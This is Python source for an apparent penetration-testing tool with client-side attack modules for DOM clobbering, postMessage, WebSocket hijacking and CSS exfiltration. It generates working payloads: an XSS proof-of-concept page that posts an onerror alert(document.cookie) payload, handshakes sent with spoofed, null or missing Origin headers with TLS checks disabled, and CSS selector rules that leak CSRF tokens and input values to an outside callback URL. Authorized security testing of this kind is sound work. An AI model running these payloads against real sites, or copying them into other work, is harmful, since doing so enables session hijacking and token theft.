        "eval_like":     [r"\beval\s*\(", r"\bFunction\s*\(", r"setTimeout\s*\(\s*['\"]"],
        "innerHTML":     [r"\.innerHTML\s*=", r"\.outerHTML\s*="],
        "src_href":      [r"\.src\s*=\s*\w", r"a\.href\s*=\s*\w"],
    }

    # Built-in clobber targets
    _KNOWN_CLOBBER_TARGETS = {
        "document.baseURI", "document.links", "window.name", "window.opener",
        "document.cookie", "document.domain", "document.URL",
    }

    def _fetch_page(self, url: str, auth: str) -> str:
        import urllib.request, urllib.error
        headers = {"User-Agent": "Mozilla/5.0", **({"Authorization": auth} if auth else {})}
        try:
            with urllib.request.urlopen(urllib.request.Request(url, headers=headers), timeout=15) as r:
                return r.read(131072).decode("utf-8", errors="replace")
        except Exception as e:
            return f"<!-- fetch error: {e} -->"

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import re

        url = params["target_url"].strip()
        js_snippet = params.get("js_snippet", "").strip()
        sink_patterns = params.get("sink_patterns", list(self._SINKS.keys()))
        auth = params.get("auth_header", "").strip()

        findings = []
        raw_lines = [f"Target: {url}"]

        if not js_snippet:
            stream("info", "Fetching page to extract inline JS and script tags...")
            html = self._fetch_page(url, auth)
            # Extract inline scripts
            scripts = re.findall(r"<script[^>]*>([\s\S]*?)</script>", html, re.IGNORECASE)
            js_snippet = "\n".join(scripts)
            raw_lines.append(f"Extracted {len(scripts)} inline script block(s)")

        if not js_snippet.strip():
            return {"status": "done", "findings": [{
                "title": "No JavaScript found to analyse",
                "severity": "info", "url": url,
                "description": "No inline scripts found. Check external JS files manually.",
                "evidence": "", "remediation": "Audit external JS files for clobbering sinks.",
            }], "raw_output": "\n".join(raw_lines)}

        clobber_hits = []
        for category in sink_patterns:
            patterns = self._SINKS.get(category, [])
            for pattern in patterns:
                for match in re.finditer(pattern, js_snippet):
                    prop = match.group(1) if match.lastindex and match.lastindex >= 1 else match.group(0)
                    line_num = js_snippet[:match.start()].count("\n") + 1
                    clobber_hits.append((category, prop, line_num, match.group(0)[:80]))

        stream("info", f"Found {len(clobber_hits)} potential clobbering sink(s)")

        if clobber_hits:
            # Group by property
            by_prop: dict = {}
            for cat, prop, line, snippet in clobber_hits:
                by_prop.setdefault(prop, []).append((cat, line, snippet))

            for prop, occurrences in list(by_prop.items())[:30]:
                poc_html = (
                    f'<a id="{prop}"></a><a id="{prop}" name="pentools" href="javascript:alert(1)"></a>'
                    if "href" not in prop.lower()
                    else f'<a id="{prop}" href="javascript:alert(1)"></a>'
                )
                findings.append({
                    "title": f"DOM clobbering sink: {prop} ({len(occurrences)} occurrence(s))",
                    "severity": "medium" if prop not in str(self._KNOWN_CLOBBER_TARGETS) else "high",
                    "url": url,
                    "description": (
                        f"Property '{prop}' is accessed in JS and could be overwritten via a named HTML element.\n"
                        f"Occurrences:\n" +
                        "\n".join(f"  Line {l}: {s}" for _, l, s in occurrences[:5])
                    ),
                    "evidence": f"PoC HTML: {poc_html}",
                    "remediation": (
                        f"Avoid using global properties as implicit inputs. "
                        f"Use strict CSP, validate all script inputs, and prefer ES modules."
                    ),
                    "cwe_id": "CWE-79",
                })

        if not findings:
            findings.append({
                "title": "No DOM clobbering sinks detected",
                "severity": "info", "url": url,
                "description": "No obvious clobbering sinks found in analysed JS.",
                "evidence": "", "remediation": "Continue manual code review for clobbering patterns.",
            })

        stream("success", f"DOM clobbering analysis complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}


# ─── [CS-06] PostMessage Exploitation ────────────────────────────────────────

class PostMessageExploitationModule(BaseModule):
    id = "CS-06"
    name = "PostMessage Exploitation"
    category = "client_side"
    description = (
        "Detect weak origin validation in postMessage event listeners by analysing "
        "JavaScript source code on the target page. Generates test HTML files to "
        "manually verify data leakage or XSS via cross-origin message passing."
    )
    risk_level = "high"
    tags = ["postmessage", "origin", "xss", "client_side", "cors", "javascript"]
    celery_queue = "web_audit_queue"
    time_limit = 60

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url",  label="Target URL",   field_type="url",  required=True,  placeholder="https://example.com"),
        FieldSchema(key="js_snippet",  label="JS Snippet (optional)", field_type="code_editor", required=False),
        FieldSchema(key="test_origin", label="Test Origin",  field_type="text", required=False, default="https://evil.example.com"),
        FieldSchema(key="auth_header", label="Authorization",field_type="text", required=False, group="credentials"),
    ]

    _UNSAFE_PATTERNS = [
        (r"addEventListener\s*\(\s*['\"]message['\"]", "addEventListener('message') listener"),
        (r"on\s*message\s*=",                          "onmessage assignment"),
        (r"e\.origin\s*===?\s*['\"]?\*['\"]?",         "Wildcard origin check (e.origin == '*')"),
        (r"\.origin\s*!==?\s*",                        "origin negation check — may be reversible"),
        (r"event\.data\s*[+,]",                        "event.data concatenation (XSS risk)"),
        (r"innerHTML\s*=.*event\.data",                "innerHTML = event.data (XSS sink)"),
        (r"eval\s*\(\s*event\.data",                   "eval(event.data) (RCE sink)"),
        (r"document\.write\s*\(\s*event\.data",        "document.write(event.data)"),
        (r"window\.location\s*=.*event\.data",         "window.location = event.data (open redirect)"),
    ]

    def _fetch(self, url: str, auth: str) -> str:
        import urllib.request
        headers = {"User-Agent": "Mozilla/5.0", **({"Authorization": auth} if auth else {})}
        try:
            with urllib.request.urlopen(urllib.request.Request(url, headers=headers), timeout=15) as r:
                return r.read(131072).decode("utf-8", errors="replace")
        except Exception as e:
            return f"<!-- {e} -->"

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import re

        url = params["target_url"].strip()
        js_snippet = params.get("js_snippet", "").strip()
        test_origin = params.get("test_origin", "https://evil.example.com")
        auth = params.get("auth_header", "").strip()

        if not js_snippet:
            stream("info", "Fetching page JS...")
            html = self._fetch(url, auth)
            js_snippet = "\n".join(re.findall(r"<script[^>]*>([\s\S]*?)</script>", html, re.IGNORECASE))

        findings = []
        raw_lines = [f"Target: {url}"]
        hits = []

        for pattern, description in self._UNSAFE_PATTERNS:
            for m in re.finditer(pattern, js_snippet, re.IGNORECASE):
                line = js_snippet[:m.start()].count("\n") + 1
                hits.append((description, line, m.group(0)[:100]))

        stream("info", f"Found {len(hits)} postMessage pattern(s)")

        has_listener = any("listener" in h[0] or "onmessage" in h[0] for h in hits)
        has_xss_sink  = any(k in h[0] for h in hits for k in ["innerHTML", "eval", "document.write"])
        has_no_origin = any("wildcard" in h[0].lower() or "≠" in h[0] for h in hits)

        if has_listener:
            sev = "critical" if has_xss_sink else ("high" if has_no_origin else "medium")
            poc_html = f"""<!DOCTYPE html>
<html><body>
<script>
// PoC for postMessage exploitation — PenTools
window.open('{url}', 'target');
setTimeout(function() {{
  window.frames[0].postMessage(
    '<img src=x onerror=alert(document.cookie)>',
    '*'  // Test with '*' first, then restrict to {url}
  );
}}, 2000);
</script>
<p>Check if the target page executes the postMessage payload.</p>
</body></html>"""

            findings.append({
                "title": f"postMessage event listener with potential weak origin check",
                "severity": sev,
                "url": url,
                "description": (
                    f"Found {len(hits)} postMessage-related pattern(s).\n"
                    "Matched patterns:\n" +
                    "\n".join(f"  Line {l}: [{d}] {s}" for d, l, s in hits[:10])
                ),
                "evidence": poc_html,
                "remediation": (
                    "Always validate event.origin against a strict allowlist. "
                    "Never use event.data directly in HTML sinks. "
                    "Use structured data (JSON) and validate schema before use."
                ),
                "cvss_score": 8.0 if has_xss_sink else 6.5,
                "cwe_id": "CWE-346",
            })

        if not findings:
            findings.append({
                "title": "No postMessage listener vulnerabilities detected",
                "severity": "info", "url": url,
                "description": "No postMessage listener patterns found or all appear to have origin checks.",
                "evidence": "", "remediation": "Test manually in browser with PoC HTML file.",
            })

        stream("success", f"postMessage analysis complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}


# ─── [CS-07] WebSocket Hijacking (CSWSH) ─────────────────────────────────────

class WebSocketHijackingModule(BaseModule):
    id = "CS-07"
    name = "WebSocket Hijacking (CSWSH)"
    category = "client_side"
    description = (
        "Test WebSocket endpoints for Cross-Site WebSocket Hijacking (CSWSH). "
        "Probes the handshake for missing or weak Origin validation, attempts to "
        "connect without or with a spoofed Origin header, and sends test messages."
    )
    risk_level = "high"
    tags = ["websocket", "cswsh", "origin", "hijacking", "client_side"]
    celery_queue = "web_audit_queue"
    time_limit = 60

    PARAMETER_SCHEMA = [
        FieldSchema(key="ws_url",           label="WebSocket URL",      field_type="url",      required=True,  placeholder="wss://example.com/ws"),
        FieldSchema(key="origin_override",  label="Spoofed Origin",     field_type="url",      required=False, default="https://evil.example.com"),
        FieldSchema(key="auth_cookie",      label="Auth Cookie",        field_type="text",     required=False, placeholder="session=abc123", group="credentials"),
        FieldSchema(key="auth_token",       label="Authorization Token", field_type="text",    required=False, group="credentials"),
        FieldSchema(key="message_payload",  label="Test Message Payload", field_type="text",   default='{"action":"ping"}'),
        FieldSchema(key="check_no_origin",  label="Test with no Origin header", field_type="toggle", default=True),
        FieldSchema(key="check_null_origin",label="Test with Origin: null",     field_type="toggle", default=True),
    ]

    def _ws_connect_test(self, ws_url: str, origin: str, cookie: str, token: str,
                         message: str, stream) -> tuple:
        """Try HTTP Upgrade to WebSocket and check response."""
        import urllib.request, urllib.error, socket, ssl, base64, os, hashlib
        from urllib.parse import urlparse

        parsed = urlparse(ws_url)
        use_tls = parsed.scheme == "wss"
        host = parsed.netloc
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        ws_key = base64.b64encode(os.urandom(16)).decode()
        headers = [
            f"GET {path} HTTP/1.1",
            f"Host: {host}",
            "Upgrade: websocket",
            "Connection: Upgrade",
            f"Sec-WebSocket-Key: {ws_key}",
            "Sec-WebSocket-Version: 13",
            "User-Agent: PenTools/1.0",
        ]
        if origin:
            headers.append(f"Origin: {origin}")
        if cookie:
            headers.append(f"Cookie: {cookie}")
        if token:
            headers.append(f"Authorization: {token}")
        request_str = "\r\n".join(headers) + "\r\n\r\n"

        port = parsed.port or (443 if use_tls else 80)
        raw_host = host.split(":")[0]
        try:
            sock = socket.create_connection((raw_host, port), timeout=10)
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=raw_host)
            sock.sendall(request_str.encode())
            resp = sock.recv(4096).decode("utf-8", errors="replace")
            sock.close()
            if "101 Switching Protocols" in resp:
                return True, resp
            return False, resp
        except Exception as e:
            return False, str(e)

    def execute(self, params: dict, job_id: str, stream) -> dict:
        ws_url = params["ws_url"].strip()
        origin = params.get("origin_override", "https://evil.example.com").strip()
        cookie = params.get("auth_cookie", "").strip()
        token = params.get("auth_token", "").strip()
        message = params.get("message_payload", '{"action":"ping"}')
        check_no_origin = params.get("check_no_origin", True)
        check_null = params.get("check_null_origin", True)

        findings = []
        raw_lines = [f"Target WS: {ws_url}"]

        # ── Spoofed origin ──
        stream("info", f"Testing with spoofed Origin: {origin}")
        accepted, resp = self._ws_connect_test(ws_url, origin, cookie, token, message, stream)
        raw_lines.append(f"Spoofed origin ({origin}): {'ACCEPTED' if accepted else 'rejected'}")
        if accepted:
            stream("success", "WebSocket handshake accepted with spoofed origin!")
            findings.append({
                "title": f"CSWSH: WebSocket accepted spoofed Origin ({origin})",
                "severity": "critical",
                "url": ws_url,
                "description": (
                    f"The WebSocket endpoint accepted a connection with Origin: {origin}. "
                    "Any cross-site page can hijack authenticated WebSocket sessions."
                ),
                "evidence": resp[:500],
                "remediation": (
                    "Validate the Origin header against a strict allowlist. "
                    "Reject connections from unexpected origins. "
                    "Use CSRF tokens in the first WebSocket message."
                ),
                "cvss_score": 8.8, "cwe_id": "CWE-346",
            })

        # ── No origin ──
        if check_no_origin:
            stream("info", "Testing with no Origin header...")
            accepted2, resp2 = self._ws_connect_test(ws_url, "", cookie, token, message, stream)
            raw_lines.append(f"No origin: {'ACCEPTED' if accepted2 else 'rejected'}")
            if accepted2:
                findings.append({
                    "title": "CSWSH: WebSocket accepted connection with no Origin header",
                    "severity": "high",
                    "url": ws_url,
                    "description": "WebSocket accepted without Origin header — could allow hijacking from non-browser clients.",
                    "evidence": resp2[:300],
                    "remediation": "Require a valid Origin header and validate against allowlist.",
                    "cvss_score": 7.4, "cwe_id": "CWE-346",
                })

        # ── Null origin ──
        if check_null:
            stream("info", "Testing with Origin: null (sandboxed iframe)...")
            accepted3, resp3 = self._ws_connect_test(ws_url, "null", cookie, token, message, stream)
            raw_lines.append(f"Null origin: {'ACCEPTED' if accepted3 else 'rejected'}")
            if accepted3:
                findings.append({
                    "title": "CSWSH: WebSocket accepted Origin: null (sandboxed iframe bypass)",
                    "severity": "high",
                    "url": ws_url,
                    "description": "Origin: null is accepted. Sandboxed iframes can exploit this to bypass SOP.",
                    "evidence": resp3[:300],
                    "remediation": "Reject Origin: null. Sandboxed iframes should not access WebSocket resources.",
                    "cvss_score": 7.4, "cwe_id": "CWE-346",
                })

        if not findings:
            findings.append({
                "title": "WebSocket origin validation appears robust",
                "severity": "info", "url": ws_url,
                "description": "All tested origins were rejected. Validate manually with browser DevTools.",
                "evidence": "\n".join(raw_lines),
                "remediation": "Continue to enforce strict origin allowlisting.",
            })

        stream("success", f"CSWSH tests complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}


# ─── [CS-11] CSS Exfiltration ─────────────────────────────────────────────────

class CSSExfiltrationModule(BaseModule):
    id = "CS-11"
    name = "CSS Exfiltration"
    category = "client_side"
    description = (
        "Generate CSS attribute selector payloads to leak HTML attribute values "
        "(e.g., CSRF tokens, data- attributes, input values) via CSS injection. "
        "Produces ready-to-use CSS snippets for use in stored XSS or CSS injection points."
    )
    risk_level = "medium"
    tags = ["css", "exfiltration", "injection", "csrf", "client_side", "leak"]
    celery_queue = "web_audit_queue"
    time_limit = 30

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_url",    label="Target URL",       field_type="url",  required=True,  placeholder="https://example.com"),
        FieldSchema(key="target_element",label="Target Element",   field_type="text", default="input",
                    help_text="HTML element to target (e.g. input, meta, [name=csrf_token])"),
        FieldSchema(key="target_attr",   label="Target Attribute", field_type="text", default="value",
                    help_text="Attribute to exfiltrate (e.g. value, content, data-token)"),
        FieldSchema(key="callback_url",  label="Exfiltration Callback URL", field_type="url", required=True,
                    placeholder="https://your-oast.interact.sh/leak?c=",
                    help_text="Receives leaked character via CSS background-image requests."),
        FieldSchema(
            key="charset",
            label="Character Set to Test",
            field_type="text",
            default="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_",
            group="advanced",
        ),
        FieldSchema(
            key="max_length",
            label="Max attribute value length to probe",
            field_type="number",
            default=32,
            group="advanced",
        ),
        FieldSchema(key="auth_header", label="Authorization", field_type="text", required=False, group="credentials"),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import re
        import urllib.request

        url = params["target_url"].strip()
        element = params.get("target_element", "input").strip()
        attr = params.get("target_attr", "value").strip()
        callback = params.get("callback_url", "").strip().rstrip("/")
        charset = params.get("charset", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_")
        max_len = int(params.get("max_length", 32))
        auth = params.get("auth_header", "").strip()

        findings = []
        raw_lines = [f"Target: {url}", f"Element: {element}[{attr}]", f"Callback: {callback}"]

        # Fetch page to confirm element exists
        stream("info", f"Fetching page to check for {element}[{attr}]...")
        try:
            headers = {"User-Agent": "Mozilla/5.0", **({"Authorization": auth} if auth else {})}
            with urllib.request.urlopen(urllib.request.Request(url, headers=headers), timeout=12) as r:
                html = r.read(65536).decode("utf-8", errors="replace")
        except Exception as e:
            html = ""
            stream("warning", f"Could not fetch page: {e}")

        element_found = bool(re.search(
            rf"<{element.split('[')[0]}\s[^>]*{attr}\s*=", html, re.IGNORECASE
        )) if element else False

        if element_found:
            stream("success", f"Found {element}[{attr}] in page source")
        else:
            stream("warning", f"{element}[{attr}] not found in page source — CSS payload generated anyway")

        # Generate CSS payload
        css_lines = [
            f"/* CSS Exfiltration Payload — PenTools [{job_id[:8]}] */",
            f"/* Target: {element}[{attr}] on {url} */",
            f"/* Each character causes a background-image request to the callback */",
            "",
        ]

        # Length probe payloads
        css_lines.append("/* === Length probe === */")
        for i in range(1, max_len + 1):
            selector = f"{element}[{attr}$=\"{'Z' * i}\"]"  # Heuristic — real length probing needs unique values
            css_lines.append(f"{element}[{attr}^=''] {{ background: url('{callback}/len_{i}'); }}")

        css_lines.append("")
        css_lines.append("/* === Character-by-character leak (prefix matching) === */")
        for char in charset[:36]:  # First 36 chars to keep payload manageable
            esc_char = char.replace("\\", "\\\\").replace('"', '\\"').replace("'", "\\'")
            css_lines.append(
                f"{element}[{attr}^='{esc_char}'] {{ background: url('{callback}/b64_{ord(char):02x}'); }}"
            )

        css_lines.append("")
        css_lines.append("/* === Meta / form token targeting === */")
        css_lines.append(f"input[name='csrf_token'][value^=''] {{ background: url('{callback}/csrf'); }}")
        css_lines.append(f"meta[name='csrf-token'][content^=''] {{ background: url('{callback}/meta_csrf'); }}")
        css_lines.append(f"input[name='_token'][value^=''] {{ background: url('{callback}/token'); }}")

        css_payload = "\n".join(css_lines)

        severity = "high" if element_found else "medium"
        findings.append({
            "title": f"CSS exfiltration payload generated for {element}[{attr}]",
            "severity": severity,
            "url": url,
            "description": (
                f"CSS attribute selector payload targeting {element}[{attr}].\n"
                f"Element present in page: {element_found}.\n"
                f"Inject via stored XSS, CSS injection point, or style= attribute.\n"
                f"Callback URL: {callback}"
            ),
            "evidence": css_payload[:3000],
            "remediation": (
                "Implement a strict Content Security Policy (CSP) blocking inline styles. "
                "Use SameSite=Strict cookies to protect CSRF tokens. "
                "Avoid CSS injection points — sanitise any user-controlled CSS."
            ),
            "cwe_id": "CWE-200",
        })

        # Analysis of page for injectable points
        inject_points = re.findall(r'style\s*=\s*["\']([^"\']{0,200})["\']', html, re.IGNORECASE)
        if inject_points:
            findings.append({
                "title": f"{len(inject_points)} inline style= attribute(s) found in page",
                "severity": "medium",
                "url": url,
                "description": "Inline style attributes detected — if any are user-controlled they could be CSS injection points.",
                "evidence": "\n".join(inject_points[:10]),
                "remediation": "Never render user input inside CSS context without strict sanitisation.",
                "cwe_id": "CWE-74",
            })

        stream("success", f"CSS exfiltration payload ready — {len(css_lines)} CSS rule(s)")
        return {"status": "done", "findings": findings, "raw_output": css_payload}
